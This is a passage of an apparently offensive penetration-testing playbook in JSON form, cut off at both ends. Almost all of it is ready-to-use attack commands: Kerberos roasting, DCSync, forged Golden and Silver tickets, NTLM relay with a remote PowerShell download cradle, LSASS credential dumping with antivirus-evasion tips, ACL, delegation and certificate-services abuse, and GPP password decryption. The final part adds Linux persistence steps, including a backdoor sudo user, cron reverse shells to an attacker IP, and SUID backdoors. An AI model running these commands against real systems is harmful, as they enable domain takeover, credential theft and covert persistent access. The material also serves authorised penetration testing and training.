    "brief_description": "Any authenticated domain user can request TGS tickets. Crack offline with hashcat. Service accounts often have weak passwords."
  },
  {
    "id": "item-ad-3",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.3 AS-REP Roasting",
    "title": "Obtain and crack AS-REP hashes from accounts without pre-authentication",
    "feasible_when": "Port 88 is open and domain user accounts have 'Do not require Kerberos preauthentication' set.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Without credentials (need userlist) ───\nimpacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt\nimpacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP>   # anonymous attempt\nimpacket-GetNPUsers <DOMAIN>/ -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt\n\n# ─── With credentials ───\nimpacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt\nimpacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -usersfile users.txt\n\n# ─── kerbrute enumeration + AS-REP ───\nkerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt\n# Then run GetNPUsers on discovered users\n\n# ─── Crack ───\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\njohn --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt"
      },
      {
        "lang": "powershell",
        "code": "# ─── Rubeus ───\n.\\Rubeus.exe asreproast /outfile:asrep.txt\n.\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt\n.\\Rubeus.exe asreproast /user:<TARGET_USER> /outfile:asrep.txt\n.\\Rubeus.exe asreproast /nowrap   # output without wrapping\n\n# ─── PowerView ───\nGet-DomainUser -UACFilter NOT_PREAUTH | Select-Object samaccountname\n# Note usernames then request with impacket"
      }
    ],
    "brief_description": "AS-REP Roasting needs no authentication — only a username list. Check BloodHound for 'AS-REP Roastable Users' node."
  },
  {
    "id": "item-ad-4",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.4 DCSync Attack",
    "title": "Use DCSync to replicate and dump all domain account hashes",
    "feasible_when": "Domain Admin credentials or DCSync rights (Replicating Directory Changes + All) are available.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── impacket-secretsdump (remote DCSync) ───\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-ntlm\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user krbtgt\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc-user administrator\nimpacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<DC_IP>\nimpacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC_FQDN>  # with Kerberos ticket\n\n# ─── CrackMapExec NTDS ───\ncrackmapexec smb <DC_IP> -u <USER> -p '<PASS>' --ntds\ncrackmapexec smb <DC_IP> -u <USER> -p '<PASS>' --ntds vss   # shadow copy method\n\n# ─── After getting krbtgt hash → Golden Ticket ───\n# Get domain SID from dump output\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> | grep 'krbtgt'\n# krbtgt hash + SID = Golden Ticket material"
      },
      {
        "lang": "powershell",
        "code": "# ─── Mimikatz DCSync ───\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /user:administrator\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /user:krbtgt\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /all /csv\" \"exit\"\n\n# ─── Grant DCSync rights to a user (if WriteDacl on domain) ───\n# PowerView\nAdd-DomainObjectAcl -TargetIdentity '<DOMAIN>' -PrincipalIdentity '<USER>' -Rights DCSync\n\n# impacket\nimpacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn 'DC=<DC>,DC=<TLD>' <DOMAIN>/<ADMIN_USER>:<PASS>\n# Then run DCSync as that user"
      }
    ],
    "brief_description": "DCSync replicates domain hashes remotely — no access to the DC's filesystem needed. Always dump krbtgt for Golden Ticket creation."
  },
  {
    "id": "item-ad-5",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.5 Golden and Silver Tickets",
    "title": "Forge Golden and Silver Kerberos tickets for persistent access",
    "feasible_when": "The krbtgt NTLM hash (Golden) or a service account hash (Silver) and the domain SID have been obtained.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Get domain SID ───\nimpacket-getPac <DOMAIN>/<USER>:<PASS> -targetUser administrator\nimpacket-lookupsid <DOMAIN>/<USER>:<PASS>@<DC_IP> 0\nwhoami /user  # if on domain-joined machine — shows SID prefix\n\n# ─── Golden Ticket (impacket) ───\nimpacket-ticketer \\\n  -nthash <KRBTGT_NTLM_HASH> \\\n  -domain-sid <DOMAIN_SID> \\\n  -domain <DOMAIN> \\\n  administrator\n# Creates: administrator.ccache\nexport KRB5CCNAME=administrator.ccache\nklist\nimpacket-psexec -k -no-pass <DOMAIN>/administrator@dc01.<DOMAIN>\nimpacket-secretsdump -k -no-pass <DOMAIN>/administrator@dc01.<DOMAIN>\n\n# ─── Silver Ticket — CIFS (file access) ───\nimpacket-ticketer \\\n  -nthash <TARGET_COMPUTER_HASH> \\\n  -domain-sid <DOMAIN_SID> \\\n  -domain <DOMAIN> \\\n  -spn CIFS/<TARGET_FQDN> \\\n  administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-smbclient -k -no-pass <DOMAIN>/administrator@<TARGET_FQDN>\n\n# ─── Silver Ticket — HTTP (web access) ───\nimpacket-ticketer \\\n  -nthash <TARGET_COMPUTER_HASH> \\\n  -domain-sid <DOMAIN_SID> \\\n  -domain <DOMAIN> \\\n  -spn HTTP/<TARGET_FQDN> \\\n  administrator"
      },
      {
        "lang": "powershell",
        "code": "# ─── Mimikatz Golden Ticket ───\n.\\mimikatz.exe \"kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt\" \"exit\"\n# /ptt = pass-the-ticket immediately into current session\n# Verify:\nklist\ndir \\\\dc01.<DOMAIN>\\C$\n\n# ─── Mimikatz Silver Ticket — CIFS ───\n.\\mimikatz.exe \"kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_FQDN> /service:cifs /rc4:<COMPUTER_HASH> /ptt\" \"exit\"\n\n# ─── Mimikatz Golden Ticket to file ───\n.\\mimikatz.exe \"kerberos::golden /user:administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ticket:golden.kirbi\" \"exit\"\n.\\Rubeus.exe ptt /ticket:golden.kirbi\n\n# ─── Diamond Ticket (more stealthy than Golden) ───\n.\\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 /krbkey:<KRBTGT_AES256> /nowrap /ptt"
      }
    ],
    "brief_description": "Golden Ticket lasts 10 years by default — persists even after password changes. Silver tickets are stealthier but service-specific."
  },
  {
    "id": "item-ad-6",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.6 NTLM Relay Attacks",
    "title": "Intercept and relay NTLM authentication with Responder and ntlmrelayx",
    "feasible_when": "SMB signing is NOT required on target hosts and the attacker can coerce or intercept authentication.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Step 1: Check for relay targets (signing disabled) ───\ncrackmapexec smb <NETWORK_CIDR> --gen-relay-list relay_targets.txt\ncrackmapexec smb <NETWORK_CIDR> -u '' -p '' | grep -i 'signing:False'\nnmap --script=smb-security-mode -p 445 <NETWORK_CIDR> | grep -B2 'message_signing: disabled'\n\n# ─── Step 2: Edit Responder.conf — disable SMB and HTTP ───\n# /etc/responder/Responder.conf:\n# SMB  = Off\n# HTTP = Off\n# (These are handled by ntlmrelayx instead)\n\n# ─── Step 3: Start ntlmrelayx ───\n# Basic SAM dump\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n\n# Interactive shell mode\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i\n# Then: nc 127.0.0.1 11000 (connects to relay shell)\n\n# Execute payload\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -e /tmp/rev.exe\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'powershell IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/rev.ps1\")'\n\n# Relay to LDAP (for AD enumeration / modifications)\nimpacket-ntlmrelayx -t ldap://<DC_IP> --no-smb-server --no-http-server -smb2support --delegate-access\nimpacket-ntlmrelayx -t ldaps://<DC_IP> -smb2support --add-computer ATTACKER$ Password123!\n\n# RBCD attack via relay\nimpacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access --no-da --no-acl\n\n# ─── Step 4: Start Responder (captures LLMNR/NBNS/mDNS) ───\nresponder -I tun0 -dwPv\n# d = DHCP poisoning, w = WPAD, P = ProxyAuth, v = verbose\n\n# ─── Step 5: Coerce authentication (if no natural opportunities) ───\n# PetitPotam (ESC8 / unauthenticated NTLM coercion)\npython3 PetitPotam.py <ATTACKER_IP> <DC_IP>   # unauthenticated\npython3 PetitPotam.py -u <USER> -p '<PASS>' -d <DOMAIN> <ATTACKER_IP> <TARGET_IP>\n\n# PrinterBug / SpoolSample\npython3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> <ATTACKER_IP>\n\n# Coercer (all coercion methods combined)\ncoercer coerce -u <USER> -p '<PASS>' -d <DOMAIN> -l <ATTACKER_IP> -t <TARGET_IP>\ncoercer scan -u <USER> -p '<PASS>' -d <DOMAIN> -t <TARGET_IP>   # check vuln first\n\n# DFSCoerce\npython3 dfscoerce.py -u '<USER>' -p '<PASS>' -d '<DOMAIN>' <ATTACKER_IP> <DC_IP>\n\n# ─── Step 6: Crack captured NetNTLMv2 hashes (from Responder) ───\nhashcat -m 5600 /usr/share/responder/logs/HTTP-NTLMv2-<DATE>.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-<DATE>.txt /usr/share/wordlists/rockyou.txt"
      }
    ],
    "brief_description": "Disable SMB/HTTP in Responder.conf when using ntlmrelayx — both can't listen on the same ports. Always check signing status first."
  },
  {
    "id": "item-ad-7",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.7 Credential Dumping",
    "title": "LSASS, SAM, and NTDS credential dumping on compromised hosts",
    "feasible_when": "A SYSTEM or Administrator shell has been obtained on a Windows target.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Mimikatz (requires SeDebugPrivilege / SYSTEM) ───\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" \"exit\"\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" \"exit\"          # cleartext if WDigest enabled\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"  # export Kerberos tickets\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::credman\" \"exit\"          # Credential Manager\n.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::msv\" \"exit\"              # MSV (NTLM hashes)\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"               # SAM hashes\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" \"exit\"         # LSA secrets\n.\\mimikatz.exe \"privilege::debug\" \"lsadump::cache\" \"exit\"             # domain cached credentials\n.\\mimikatz.exe \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\"      # elevate token first\n\n# ─── LSASS dump without Mimikatz (bypass AV) ───\n# comsvcs.dll (native Windows)\n$id = (Get-Process lsass).Id\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $id C:\\Windows\\Temp\\lsass.dmp full\n# or via cmd:\ntasklist | findstr lsass   # get PID\nrundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full\n\n# procdump (Sysinternals)\n.\\procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp\n.\\procdump64.exe -accepteula -64 -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp\n\n# Task Manager GUI\n# Ctrl+Shift+Esc → Details → right-click lsass.exe → Create Dump File\n\n# ProcDump via Sysinternals Live\nwmic process call create 'C:\\Users\\Public\\procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp'\n\n# ─── Parse LSASS dump on attacker ───\npypykatz lsa minidump lsass.dmp\npypykatz lsa minidump lsass.dmp -o lsass_output.txt\npypykatz lsa minidump lsass.dmp | grep 'Username:\\|NT:'\n\n# Impacket\nimpacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL\n\n# ─── Remote dump (if admin) ───\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --lsa\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --sam\ncrackmapexec smb <TARGET_IP> -u <USER> -p '<PASS>' --ntds   # DC only\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
      }
    ],
    "brief_description": "Use comsvcs.dll MiniDump to dump LSASS without touching mimikatz on disk. Parse with pypykatz on the attacker machine."
  },
  {
    "id": "item-ad-8",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.8 ACL Abuse",
    "title": "Enumerate and exploit Active Directory ACL misconfigurations",
    "feasible_when": "BloodHound reveals ACL edges such as GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, or AddMember.",
    "snippets": [
      {
        "lang": "powershell",
        "code": "# ─── Find interesting ACLs ───\nFind-InterestingDomainAcl -ResolveGUIDs\nFind-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match '<USER_OR_GROUP>' }\nGet-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner' }\nGet-ObjectAcl -SamAccountName <TARGET_USER> -ResolveGUIDs | Select ObjectSID,IdentityReference,ActiveDirectoryRights\n\n# ─── ACL abuse reference ───\n# GenericAll      → full control: reset password, add to group, read LAPS\n# GenericWrite    → write any property: set SPN for Kerberoast, change logon script\n# WriteProperty   → write specific properties\n# WriteDacl       → add new ACL → grant DCSync or GenericAll\n# WriteOwner      → take ownership → then write DACL\n# ForceChangePassword → reset user's password without knowing it\n# AddMember       → add users to the group\n# AllExtendedRights → all extended rights: ForceChangePassword, send-as, receive-as\n# ReadLAPSPassword → read LAPS admin password"
      },
      {
        "lang": "bash",
        "code": "# ─── GenericAll / ForceChangePassword → reset user password ───\nnet rpc password '<TARGET_USER>' '<NEW_PASS>' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>\nimpacket-changepasswd '<DOMAIN>/<TARGET_USER>@<DC_IP>' -newpass '<NEW_PASS>' -altuser '<USER>' -altpass '<PASS>'\n\n# ─── AddMember → add self to privileged group ───\nimpacket-net '<DOMAIN>/<USER>:<PASS>@<DC_IP>' 'group \"Domain Admins\" <USER> /add'\n# PowerView:\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members '<USER>' -Credential $cred\n\n# ─── WriteDacl → grant DCSync rights ───\nimpacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn 'DC=<DC>,DC=<TLD>' <DOMAIN>/<ADMIN>:<PASS>\n# Then run DCSync as that user:\nimpacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>\n\n# ─── GenericWrite → targeted Kerberoasting (set SPN) ───\n# PowerView:\nSet-DomainObject -Identity '<TARGET_USER>' -Set @{serviceprincipalname='fake/spn'} -Credential $cred\n# Now Kerberoast that user:\nimpacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile targeted_kerberoast.txt\nhashcat -m 13100 targeted_kerberoast.txt /usr/share/wordlists/rockyou.txt\n# Clean up after:\nSet-DomainObject -Identity '<TARGET_USER>' -Clear serviceprincipalname -Credential $cred\n\n# ─── WriteOwner → become owner → add self as admin ───\n# PowerView:\nSet-DomainObjectOwner -Identity '<TARGET_GROUP>' -OwnerIdentity '<USER>' -Credential $cred\nAdd-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights All -Credential $cred\nAdd-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<USER>' -Credential $cred\n\n# ─── ReadLAPSPassword → get local admin password ───\nGet-DomainComputer -Filter '(ms-Mcs-AdmPwd=*)' -Properties ms-Mcs-AdmPwd,dnshostname\ncrackmapexec ldap <DC_IP> -u <USER> -p '<PASS>' --module laps\nimpacket-GetLAPSPassword <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
      }
    ],
    "brief_description": "BloodHound's 'Outbound Object Control' shows every ACL edge from owned principals. WriteDacl → DCSync is a common chain."
  },
  {
    "id": "item-ad-9",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.9 Delegation Attacks",
    "title": "Exploit unconstrained, constrained, and RBCD delegation",
    "feasible_when": "BloodHound/PowerView reveals unconstrained or constrained delegation, or current user has GenericWrite on a computer object (for RBCD).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Find delegation ───\n# Unconstrained\nGet-DomainComputer -Unconstrained | Select-Object dnshostname\nGet-DomainUser -AllowDelegation -AdminCount | Select-Object samaccountname\n\n# Constrained\nGet-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto\nGet-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto\n\n# ─── Unconstrained Delegation exploit ───\n# Step 1: Access the unconstrained host (already compromised)\n# Step 2: Coerce a DC to authenticate to the unconstrained host\npython3 printerbug.py <DOMAIN>/<USER>:<PASS>@<DC_IP> <UNCONSTRAINED_HOST>\npython3 PetitPotam.py -u <USER> -p '<PASS>' -d <DOMAIN> <UNCONSTRAINED_HOST_IP> <DC_IP>\n# Step 3: Monitor and capture TGT on unconstrained host\n.\\Rubeus.exe monitor /interval:5 /nowrap\n# Step 4: Use captured DC TGT for DCSync\n.\\Rubeus.exe ptt /ticket:<BASE64_TGT>\nklist\nimpacket-secretsdump -k -no-pass <DOMAIN>/dc01@dc01.<DOMAIN>\n\n# ─── Constrained Delegation exploit ───\n# Request service ticket on behalf of administrator\nimpacket-getST -spn CIFS/<TARGET_FQDN> -impersonate administrator <DOMAIN>/<SVC_ACCOUNT>:<PASS>\nexport KRB5CCNAME=administrator@CIFS_<TARGET_FQDN>.ccache\nimpacket-psexec -k -no-pass <DOMAIN>/administrator@<TARGET_FQDN>\n\n# With hash\nimpacket-getST -spn CIFS/<TARGET_FQDN> -impersonate administrator -hashes :<NTLM_HASH> <DOMAIN>/<SVC_ACCOUNT>\n\n# ─── RBCD (Resource-Based Constrained Delegation) attack ───\n# Requires: GenericWrite or WriteMSDS-AllowedToActOnBehalfOfOtherIdentity on target computer\n\n# Step 1: Create a new computer account (or use existing machine account)\nimpacket-addcomputer <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -computer-name 'ATTACKER$' -computer-pass 'Attacker123!'\n\n# Step 2: Set RBCD attribute on target\nimpacket-rbcd <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -action write -delegate-from 'ATTACKER$' -delegate-to '<TARGET_COMPUTER>$'\n\n# Step 3: Get service ticket as administrator\nimpacket-getST -spn CIFS/<TARGET_FQDN> -impersonate administrator <DOMAIN>/'ATTACKER$':'Attacker123!'\nexport KRB5CCNAME=administrator@CIFS_<TARGET_FQDN>.ccache\n\n# Step 4: Use ticket\nimpacket-psexec -k -no-pass <DOMAIN>/administrator@<TARGET_FQDN>\nimpacket-secretsdump -k -no-pass <DOMAIN>/administrator@<TARGET_FQDN>\n\n# ─── Cleanup RBCD ───\nimpacket-rbcd <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -action remove -delegate-from 'ATTACKER$' -delegate-to '<TARGET_COMPUTER>$'\nimpacket-addcomputer <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -delete"
      }
    ],
    "brief_description": "Unconstrained delegation hosts capture DC TGTs when coerced — combine with PetitPotam for full domain compromise. RBCD needs only GenericWrite."
  },
  {
    "id": "item-ad-10",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.10 AD CS Certificate Abuse (ESC1-ESC8)",
    "title": "Enumerate and exploit Active Directory Certificate Services misconfigurations",
    "feasible_when": "AD CS is present in the environment and vulnerable certificate templates exist (detectable via certipy or Certify).",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Discover AD CS ───\ncertipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP>\ncertipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout\ncertipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -enabled   # only enabled templates\n\n# ─── ESC1 — Enrollee supplies SAN (most common) ───\n# Template allows requestor to specify UPN / SAN, and enrollee can enroll\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' \\\n  -ca '<CA_NAME>' \\\n  -template '<VULN_TEMPLATE>' \\\n  -upn 'administrator@<DOMAIN>' \\\n  -dc-ip <DC_IP>\n# Output: administrator.pfx\n\n# Authenticate with certificate → get NTLM hash\ncertipy auth -pfx administrator.pfx -dc-ip <DC_IP>\n# Output: NTLM hash + TGT\n\n# ─── ESC2 — Any Purpose / Subordinate CA template ───\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -dc-ip <DC_IP>\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>\n\n# ─── ESC3 — Enrollment Agent ───\n# Step 1: Get enrollment agent cert\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<ENROLLMENT_AGENT_TEMPLATE>' -dc-ip <DC_IP>\n# Step 2: Request cert on behalf of admin\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<USER_TEMPLATE>' -on-behalf-of '<DOMAIN>\\administrator' -pfx agent.pfx -dc-ip <DC_IP>\n\n# ─── ESC4 — Vulnerable template permissions (WritePKIEnrollmentFlag) ───\n# Modify template to be vulnerable (if user has write rights)\ncertipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -template '<TEMPLATE>' -save-old\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>\n# Restore template:\ncertipy template -u '<USER>@<DOMAIN>' -p '<PASS>' -template '<TEMPLATE>' -configuration '<TEMPLATE>.json'\n\n# ─── ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA ───\n# Check if CA has this flag\ncertipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> | grep 'EDITF_ATTRIBUTESUBJECTALTNAME2'\n# Exploit any template with Client Authentication\ncertipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -template 'User' -upn 'administrator@<DOMAIN>' -dc-ip <DC_IP>\n\n# ─── ESC8 — NTLM Relay to AD CS HTTP endpoint ───\n# Setup relay to AD CS Web Enrollment\nimpacket-ntlmrelayx -t 'http://<CA_SERVER>/certsrv/certfnsh.asp' -smb2support --adcs --template '<TEMPLATE>'\n# Coerce authentication from target:\npython3 PetitPotam.py <ATTACKER_IP> <DC_IP>\n# Receive base64 PFX\ncertipy auth -pfx '<B64_PFX>' -dc-ip <DC_IP>\n\n# ─── After auth with certipy ─── Use NTLM hash from certipy auth\nimpacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/administrator@<DC_IP>\ncrackmapexec smb <DC_IP> -u administrator -H <NTLM_HASH>"
      },
      {
        "lang": "powershell",
        "code": "# ─── Certify (Windows) ───\n.\\Certify.exe cas\n.\\Certify.exe find /vulnerable\n.\\Certify.exe find /enrolleeSuppliesSubject\n.\\Certify.exe request /ca:'<CA_MACHINE>\\<CA_NAME>' /template:'<VULN_TEMPLATE>' /altname:'administrator'\n# Outputs certificate → save as .pem/.pfx\n# Convert to pfx on attacker:\n# openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx\n\n# Rubeus auth with cert\n.\\Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /ptt"
      }
    ],
    "brief_description": "ESC1 is the most common AD CS vulnerability — certipy find highlights it immediately. Request admin cert, auth to get NTLM hash."
  },
  {
    "id": "item-ad-11",
    "phase": "11. Active Directory & Domain Compromise",
    "step": "11.11 GPP Passwords and SYSVOL",
    "title": "Extract and decrypt GPP cpassword values from SYSVOL",
    "feasible_when": "The SYSVOL share is accessible with domain credentials — typically on all Domain Controllers.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── CrackMapExec modules ───\ncrackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -M gpp_password\ncrackmapexec smb <DC_IP> -u <USER> -p '<PASS>' -M gpp_autologin\n\n# ─── Manual SYSVOL search ───\n# Mount SYSVOL\nmkdir /mnt/sysvol\nmount -t cifs //<DC_IP>/SYSVOL /mnt/sysvol -o username=<USER>,password=<PASS>,domain=<DOMAIN>\nfind /mnt/sysvol -name '*.xml' | xargs grep -l 'cpassword' 2>/dev/null\ncat /mnt/sysvol/<DOMAIN>/Policies/<GUID>/MACHINE/Preferences/Groups/Groups.xml\n\n# SMB search without mounting\nimpacket-Get-GPPPassword <DOMAIN>/<USER>:<PASS>@<DC_IP>\nsmbclient //<DC_IP>/SYSVOL -U '<USER>%<PASS>' -c 'recurse; ls'\nfindstr /S /I cpassword \\\\\\\\<DC_IP>\\\\SYSVOL\\\\<DOMAIN>\\\\Policies\\\\*.xml 2>nul  # from Windows\n\n# ─── Decrypt cpassword ───\ngpp-decrypt '<CPASSWORD_VALUE>'\n# Manual: AES-256-CBC with known key\npython3 -c \"\nimport base64, hashlib\nfrom Crypto.Cipher import AES\nkey = hashlib.sha256(b'DEPRECATED').digest()\nciphertext = base64.b64decode('<CPASSWORD_VALUE>=')\niv = b'\\x00' * 16\ncipher = AES.new(key, AES.MODE_CBC, iv)\nprint(cipher.decrypt(ciphertext).decode('utf-8','ignore'))\n\"\n\n# ─── Common GPP file locations ───\n# Groups.xml — local account info\n# Services.xml — service account creds\n# Scheduledtasks.xml — scheduled task creds\n# DataSources.xml — DB connection strings\n# Printers.xml — printer config\n# Drives.xml — mapped drive creds\nfind /mnt/sysvol -name 'Groups.xml' -o -name 'Services.xml' -o -name 'Scheduledtasks.xml' -o -name 'DataSources.xml' 2>/dev/null | xargs grep -l 'cpassword' 2>/dev/null\n\n# ─── LAPS passwords (if accessible) ───\nGet-DomainComputer -Filter '(ms-Mcs-AdmPwd=*)' -Properties ms-Mcs-AdmPwd,dnshostname 2>/dev/null\ncrackmapexec ldap <DC_IP> -u <USER> -p '<PASS>' --module laps"
      }
    ],
    "brief_description": "GPP cpasswords use a publicly known AES key — gpp-decrypt instantly recovers them. Check all XML file types in SYSVOL, not just Groups.xml."
  },

  // ============================================================
  // PHASE 12 — PERSISTENCE & LOOTING
  // ============================================================
  {
    "id": "item-persist-1",
    "phase": "12. Persistence & Looting",
    "step": "12.1 Linux Persistence",
    "title": "Establish persistence on Linux targets",
    "feasible_when": "Root access has been achieved on a Linux target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# ─── Backdoor user ───\nuseradd -m -s /bin/bash -G sudo hacker\necho 'hacker:Password123!' | chpasswd\necho 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\n\n# Verify\ngrep hacker /etc/passwd\ngrep hacker /etc/shadow\n\n# ─── SSH key persistence ───\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\necho '<YOUR_SSH_PUBLIC_KEY>' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n\n# For another user\nmkdir -p /home/<USER>/.ssh\necho '<YOUR_SSH_PUBLIC_KEY>' >> /home/<USER>/.ssh/authorized_keys\nchown -R <USER>:<USER> /home/<USER>/.ssh\nchmod 700 /home/<USER>/.ssh\nchmod 600 /home/<USER>/.ssh/authorized_keys\n\n# ─── Cron-based reverse shell ───\n(crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1') | crontab -\n# Or as root:\necho '*/5 * * * * root bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\"' >> /etc/crontab\necho '*/5 * * * * root /tmp/revsh.sh' >> /etc/cron.d/sysupdate\n\n# ─── SUID backdoor ───\ncp /bin/bash /tmp/.hidden\nchmod +s /tmp/.hidden\n/tmp/.hidden -p\n\n# ─── Rootkit-style hidden backdoor ───\ncp /bin/bash /var/lib/.systemd-session\nchmod 4755 